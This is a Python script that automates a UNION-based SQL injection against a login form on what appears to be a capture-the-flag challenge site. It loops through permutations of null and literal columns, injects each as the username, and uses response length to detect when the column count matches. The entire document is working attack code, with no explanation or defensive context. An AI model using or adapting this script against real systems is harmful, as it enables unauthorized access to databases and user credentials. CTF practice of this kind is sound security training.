import requests
import itertools

HOST = 'http://web.challenges.pwnerrank.com/'
ACTION = 'c92edacc9328d1a39ec1fc4f55422a1c/index.php'

a = ['1', '"test"']

for k in range(1, 10):
    print("Testing for k = {} nulls".format(k))
    a.append('null')
    b = [','.join(item) for item in list(itertools.permutations(a))]

    for h in b:
        query = 'AND 0=1 union select ' + h
        sql_injection = "' {} -- ".format(query)
        data = {'username': sql_injection, 'password': 'test'}
        response = requests.post(HOST + ACTION, data)
        if response.headers['Content-Length'] != '1369':
            print(response.content)
            break
        if response.status_code != requests.codes.ok:
            print(response.status_code)
            print(response.content)
